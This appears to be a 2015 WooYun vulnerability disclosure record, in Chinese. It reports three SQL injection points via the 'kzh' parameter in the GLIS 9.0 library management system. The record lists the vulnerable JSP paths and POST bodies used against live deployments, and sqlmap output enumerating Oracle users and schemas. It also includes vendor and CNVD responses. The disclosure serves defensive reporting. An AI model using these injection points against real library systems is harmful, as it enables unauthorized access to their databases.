{"id": 67559, "wybug_id": "wooyun-2015-0132188", "wybug_title": "通用图书馆集成系统GLIS9.0高危注入", "wybug_corp": "北京清大新洋科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-08-14 17:21", "wybug_open_date": "2015-11-12 12:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-14：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-08-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向公众公开  简要描述： RT 详细说明：  \n厂商：北京清大新洋科技有限公司官网：http://**.**.**.**/用户：http://**.**.**.**/yonghu.html\n这系统卖的挺贵的啊，看产品报价：http://**.**.**.**/cp/glis90.html\n产品名称：通用图书馆集成系统GLIS9.0市场价格：198000元(FOR WIN)、228000元(FOR UNIX)代理价格：138600元(FOR WIN)、159600元(FOR UNIX)其它：以上报价为基本版，每增加一个用户加5000元。\n每次提洞在wooyun先看前辈的洞，然后接着挖http://**.**.**.**/bugs/wooyun-2010-099335http://**.**.**.**/bugs/wooyun-2014-079840http://**.**.**.**/bugs/wooyun-2010-085319http://**.**.**.**/bugs/wooyun-2010-082667看到用户还是有点哆嗦的。。。看截图\n\n因为案例较多，随便一搜就很多：这里来一些（22个）：\nhttp://**.**.**.**:8000/opac/http://**.**.**.**/opac/**.**.**.**:8090/opac/**.**.**.**:8089/opac/http://**.**.**.**:8090/opac/**.**.**.**:8089/opac/**.**.**.**:8089/opac/**.**.**.**:8070/opac/http://**.**.**.**:8000/opac/**.**.**.**:8070/opac/**.**.**.**/opac/http://**.**.**.**:8070/**.**.**.**:8086/opac/**.**.**.**:8088/opac/**.**.**.**:8089/opac/**.**.**.**:8070/opac/**.**.**.**:8080/opac/**.**.**.**:8089/opac/**.**.**.**:8070/opac/**.**.**.**:8070/opac/**.**.**.**:8070/opac/**.**.**.**:8070/opac/\n下面就闲话少说，看洞：注入一：\n文件：xskp.jspPOST参数kzh存在注入\n注入二：\n文件：ckmarc.jspPOST参数kzh存在注入\n注入三：\n文件：eaaldetail.jsp参数：kzh存在注入\n上述三个洞均已排除前人提交的漏洞，无重复。每个注入拿两个案例证明注入一、===========================================案例1、\n**.**.**.**:8088//opac/xskp.jspPOST：kzh=zyk0040640&dztm=&dctm=\n\n\n\n\n数据信息（17个库）：\nweb application technology: JSPback-end DBMS: Oracle[18:13:30] [INFO] fetching current user[18:13:30] [WARNING] reflective value(s) found and filtering oucurrent user:    'USRGLIS'[18:13:30] [INFO] fetching current databasecurrent schema (equivalent to database on Oracle):    'USRGLIS'[18:13:30] [WARNING] schema names are going to be used on Oracl as the counterpart to database names on other DBMSes[18:13:30] [INFO] fetching database (schema) namesavailable databases [17]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] TSG[*] TSMSYS[*] USRGLIS[*] WMSYS[*] XDB\n案例2、\n**.**.**.**:8080/opac/xskp.jspPOST：kzh=zyk0040640&dztm=&dctm=\n\n\n注入二、===========================================案例1、\n**.**.**.**:8088//opac/ckmarc.jspPOST:kzh=zyk0040640\n\n\n案例2、\n**.**.**.**:8080/opac/ckmarc.jspPOST:kzh=zyk0040640\n\n\n数据库信息：\nweb application technology: JSPback-end DBMS: Oracle[18:36:49] [INFO] fetching current usercurrent user:    'USRGLIS'[18:36:49] [INFO] fetching current databasecurrent schema (equivalent to database on Oracle):    'USRGLIS'[18:36:49] [WARNING] schema names are going to be used on Oracle as the counterpart to database names on other DBMSes[18:36:49] [INFO] fetching database (schema) names[18:36:51] [INFO] the SQL query used returns 9 entries[18:36:51] [INFO] starting 5 threads[18:36:52] [INFO] retrieved: \"EXFSYS\"[18:36:52] [INFO] retrieved: \"APEX_030200\"[18:36:52] [INFO] retrieved: \"MDSYS\"[18:36:52] [INFO] retrieved: \"CTXSYS\"[18:36:52] [INFO] retrieved: \"OLAPSYS\"[18:36:55] [INFO] retrieved: \"SYSTEM\"[18:36:55] [INFO] retrieved: \"XDB\"[18:36:55] [INFO] retrieved: \"USRGLIS\"[18:36:55] [INFO] retrieved: \"SYS\"available databases [9]:[*] APEX_030200[*] CTXSYS[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] SYS[*] SYSTEM[*] USRGLIS[*] XDB\n注入三、===========================================案例1、\n**.**.**.**:8088//opac/eaal/eaaldetail.jsp?kzh=zyk0040640\n\n\n看看用户和库\n\n案例2、\n**.**.**.**/opac/eaal/eaaldetail.jsp?kzh=zyk0040640\n\n\n案例3、\n**.**.**.**:8080/opac/eaal/eaaldetail.jsp?kzh=zyk0040640\n\n\n数据库：\n\n   漏洞证明：  已证明   修复方案：  过滤+升级   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-08-14 12:26 厂商回复： CNVD确认所述情况，已由CNVD通过软件生产厂商公开联系渠道向邮件通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}